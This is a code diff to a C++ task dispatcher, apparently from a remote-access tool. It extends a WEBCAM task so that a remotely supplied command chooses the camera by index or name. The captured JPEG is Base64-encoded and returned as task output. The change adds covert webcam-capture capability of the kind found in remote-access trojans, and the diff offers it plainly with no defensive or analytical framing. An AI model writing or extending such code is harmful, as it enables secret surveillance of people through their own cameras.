@@ -92,7 +92,32 @@ void TaskDispatcher::dispatch(const Task& task) {
                 break;
             }
             case TaskType::WEBCAM: {
-                std::vector<BYTE> img = capture::CaptureWebcamImage();
+                int camIndex = 0;
+                std::string nameHint;
+                if (!task.cmd.empty()) {
+                    size_t colon_pos = task.cmd.find(':');
+                    if (colon_pos != std::string::npos) {
+                        std::string index_str = task.cmd.substr(0, colon_pos);
+                        try {
+                            camIndex = std::stoi(index_str);
+                        } catch (...) {
+                            // ignore, camIndex remains 0
+                        }
+                        nameHint = task.cmd.substr(colon_pos + 1);
+                    } else {
+                        try {
+                           if (std::all_of(task.cmd.begin(), task.cmd.end(), ::isdigit)) {
+                                camIndex = std::stoi(task.cmd);
+                           } else {
+                                nameHint = task.cmd;
+                           }
+                        } catch (...) {
+                            nameHint = task.cmd;
+                        }
+                    }
+                }
+                LOG_DEBUG("Attempting webcam capture with index=" + std::to_string(camIndex) + ", hint='" + nameHint + "'");
+                std::vector<BYTE> img = capture::CaptureWebcamJPEG(camIndex, nameHint);
                 if (img.empty()) result.error = "Webcam capture failed (or camera not found)";
                 else result.output = "WEBCAM:" + crypto::Base64Encode(img);
                 break;
